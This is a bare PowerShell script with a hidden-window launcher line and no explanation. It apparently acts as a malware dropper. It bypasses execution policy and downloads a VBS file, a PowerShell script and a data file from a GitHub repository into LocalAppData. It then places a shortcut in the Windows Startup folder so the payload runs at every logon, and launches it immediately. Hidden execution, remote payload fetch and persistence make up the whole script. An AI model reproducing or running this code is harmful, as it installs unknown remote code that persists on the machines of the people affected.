cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"

$LocalAppDataFolder = [System.Environment]::GetFolderPath('LocalApplicationData')
$StartupFolder = [System.Environment]::GetFolderPath('Startup')

$StartVbsPath = Join-Path -Path $LocalAppDataFolder -ChildPath "Start.vbs"
$SystemPs1Path = Join-Path -Path $LocalAppDataFolder -ChildPath "System.ps1"
$DataDatPath = Join-Path -Path $LocalAppDataFolder -ChildPath "data.dat"
$StartLnkPath = Join-Path -Path $StartupFolder -ChildPath "Start.lnk"

$Urls = @{
    $StartVbsPath = "https://github.com/lee-willie/Data/raw/refs/heads/main/Start.vbs"
    $SystemPs1Path = "https://github.com/lee-willie/Data/raw/refs/heads/main/System.ps1"
    $DataDatPath = "https://github.com/lee-willie/Data/raw/refs/heads/main/data.dat"
}

foreach ($Path in $Urls.Keys) { Invoke-WebRequest -Uri $Urls[$Path] -OutFile $Path }

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($StartLnkPath)
$Shortcut.TargetPath = $StartVbsPath
$Shortcut.Save()

Start-Sleep -Seconds 3

Start-Process -FilePath $StartLnkPath
